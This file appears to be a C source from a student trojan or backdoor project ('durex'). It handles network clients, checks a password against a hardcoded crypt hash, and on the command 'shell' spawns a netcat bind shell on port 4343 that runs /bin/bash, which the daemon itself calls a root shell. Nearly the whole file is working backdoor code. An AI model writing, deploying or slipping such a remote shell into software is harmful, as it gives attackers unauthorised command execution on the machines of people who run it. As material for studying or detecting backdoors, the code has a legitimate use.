/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   thread.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: hivian <hivian@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/06/05 10:27:26 by hivian            #+#    #+#             */
/*   Updated: 2017/07/17 17:09:05 by hivian           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"

static void			run_shell(int sock)
{
	pid_t pid = fork();

	if (pid == 0)
	{
		pthread_mutex_lock(&lock);
		close(sock);
		pthread_mutex_unlock(&lock);
		char *args[] = {"nc", "-l", "-p4343", "-e/bin/bash", (char *) 0};
		execv("/bin/nc", args);
	}
}

static void			loop(t_thread_params *c, char *buffer, int *ret, int sock,
char *ip, int port)
{
	char const		*pass = "A9ydQdSSfi/JY";
	char			salt[] = "A9";
	char			*message;
	char			str[256];
	bool			is_logged = false;

	while ((*ret = recv(sock, buffer, BUF_SIZE, 0)) > 0) {
		char *trim = strtrim(buffer);
		bzero(str, sizeof(str));
		if (!trim)
		{
			print_logs(c->logs, "Malloc error");
			continue ;
		}
		if (!is_logged) {
			if (!strcmp(crypt(trim, salt), pass)) {
				message = "[Daemon] Authentication success.\n";
				snprintf(str, sizeof(str), "[Client %s:%d] %s",
					ip, port, message);
				print_logs_n(c->logs, str);
				send(sock, message, strlen(message), 0);
				message = "[Daemon] Type \"shell\" to run the root shell.\n";
				send(sock, message, strlen(message), 0);
				is_logged = true;
			} else {
				message = "Authentication failed.\n";
				snprintf(str, sizeof(str), "[Client %s:%d] %s",
					ip, port, message);
				print_logs_n(c->logs, str);
				message = "[Daemon] Password: ";
				send(sock, message, strlen(message), 0);
			}
		} else {
			if (!strcmp(trim, "shell")) {
				message = "[Daemon] Spawning shell on port 4343.\n";
				send(sock, message, strlen(message), 0);
				strdel(&trim);
				*ret = 0;
				print_logs(c->logs, "Shell active.");
				run_shell(sock);
				break;
			} else {
				message = "[Daemon] Invalid command. Try again.\n";
				send(sock, message, strlen(message), 0);
			}
		}
		bzero(str, sizeof(str));
		bzero(buffer, BUF_SIZE);
		strdel(&trim);
	}
}

void				*thread_handler(void *context)
{
    int				ret;
    char			buffer[BUF_SIZE];
	char			str[256];
	t_thread_params	*c = (t_thread_params*)context;
	int sock = c->csock;
	char *ip = c->cli_ip;
	int port = c->cli_port;

	bzero(str, sizeof(str));
	bzero(buffer, sizeof(buffer));
	char *message = "[Daemon] Password: ";
    send(sock, message, strlen(message), 0);
	loop(c, buffer, &ret, sock, ip, port);
    if (ret == 0)
    {
		pthread_mutex_lock(&lock);
		c->total_connection--;
		pthread_mutex_unlock(&lock);
		snprintf(str, sizeof(str), "[Client %s:%d] disconnected.", ip, port);
		print_logs(c->logs, str);
    }
    else if (ret == -1) {
		snprintf(str, sizeof(str), "[Client %s:%d] Recv error.", ip, port);
		print_logs(c->logs, str);
	}
	pthread_mutex_lock(&lock);
	close(sock);
	pthread_mutex_unlock(&lock);
	return (NULL);
}
